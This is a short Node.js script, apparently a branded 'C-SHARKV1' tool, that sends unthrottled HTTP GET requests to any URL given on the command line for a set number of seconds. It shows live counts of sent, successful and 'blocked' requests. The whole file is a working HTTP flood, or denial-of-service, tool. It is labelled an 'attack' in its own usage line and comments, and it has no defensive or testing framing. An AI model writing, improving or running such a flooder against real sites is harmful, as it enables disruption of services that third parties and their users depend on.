const axios = require('axios');

// Get command line arguments: target URL and duration
const [,, targetUrl, timeInSeconds] = process.argv;

if (!targetUrl || !timeInSeconds) {
  console.log('Usage: node attack.js <target_url> <time_in_seconds>');
  process.exit(1);
}

// Convert timeInSeconds to a number and ensure it's valid
const durationInMs = parseInt(timeInSeconds, 10) * 1000;
if (isNaN(durationInMs) || durationInMs <= 0) {
  console.log('Please provide a valid time in seconds.');
  process.exit(1);
}

// Variables to track stats
let totalRequests = 0;
let successfulRequests = 0;
let blockedRequests = 0;
let peakRps = 0;
let lastRequestsCount = 0;
let startTime = Date.now();
let stopTime = startTime + durationInMs;

// Function to send HTTP requests
const sendRequest = async () => {
  try {
    const response = await axios.get(targetUrl);
    successfulRequests++;
  } catch (error) {
    blockedRequests++;
  }

  totalRequests++;
};

// Function to display live statistics (overwritten every 100ms)
const displayStats = () => {
  const currentTime = Date.now();
  const elapsedTime = currentTime - startTime;
  const remainingTime = Math.max(stopTime - currentTime, 0);
  
  // Calculate the current requests per second (RPS)
  const rps = totalRequests - lastRequestsCount;
  peakRps = Math.max(peakRps, rps);

  // Prepare output message
  const statsMessage = `
C-SHARKV1 - T.ME/STSVKINGDOM

Total Sent: ${totalRequests}
Max-RPS: ${peakRps}
Success: ${successfulRequests}
Blocked: ${blockedRequests}
Time Remaining: ${Math.ceil(remainingTime / 1000)}s
`;

  // Output stats, overwriting the terminal every 100ms
  process.stdout.write(`\r${statsMessage}`);
  lastRequestsCount = totalRequests;
};

// Function to perform the flooding attack
const performFlood = () => {
  console.log('Starting flood attack...');

  // Flooding continuously without delay
  const floodInterval = setInterval(() => {
    if (Date.now() > stopTime) {
      clearInterval(floodInterval); // Stop after the time limit is reached
      console.log('\nFlood test completed.');
      return;
    }

    // Send requests continuously
    sendRequest();

    // Update live stats every 100ms
    displayStats();
  }, 0); // No delay between requests (flooding the server)
};

// Start the flood attack
performFlood();
